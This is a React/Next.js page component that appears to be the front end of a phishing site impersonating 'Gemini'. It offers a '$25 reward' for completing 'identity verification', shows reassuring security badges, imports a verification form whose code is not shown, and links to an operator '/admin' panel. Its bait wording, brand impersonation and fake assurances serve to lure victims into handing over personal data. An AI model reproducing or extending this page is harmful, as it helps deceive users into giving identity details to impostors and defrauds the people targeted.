import Head from "next/head";
import VerificationForm from "@/Components/VerificationForm";
import Link from "next/link";

export default function Home() {
  return (
    <>
      <div className="fixed bottom-6 right-6">
        <Link
          href="/admin"
          className="bg-blue-600 text-white p-3 rounded-full shadow-lg hover:bg-blue-700 transition-colors"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-6 w-6"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"
            />
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
            />
          </svg>
          <span className="sr-only">Admin Panel</span>
        </Link>
      </div>
      
      <Head>
        <title>Gemini Verification</title>
        <meta
          name="description"
          content="Complete your Gemini identity verification"
        />
      </Head>

      <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 py-12 px-4 sm:px-6">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-8">
            <div className="inline-flex items-center justify-center bg-white p-4 rounded-full shadow-lg mb-4">
              <span className="text-2xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent">
                Gemini
              </span>
            </div>
            <h1 className="text-3xl font-bold text-gray-900">
              Identity Verification
            </h1>
            <p className="text-gray-500 mt-2">
              Complete verification to claim your $25 reward
            </p>
          </div>

          <VerificationForm />

          <div className="mt-12 text-center text-sm text-gray-500">
            <div className="flex justify-center space-x-6 mb-4">
              {["🔒", "🛡️", "🔑"].map((icon, i) => (
                <div key={i} className="bg-white p-3 rounded-full shadow-sm">
                  <span className="text-xl">{icon}</span>
                </div>
              ))}
            </div>
            <p>Bank-level 256-bit SSL encryption • GDPR compliant</p>
          </div>
        </div>
      </div>
    </>
  );
}
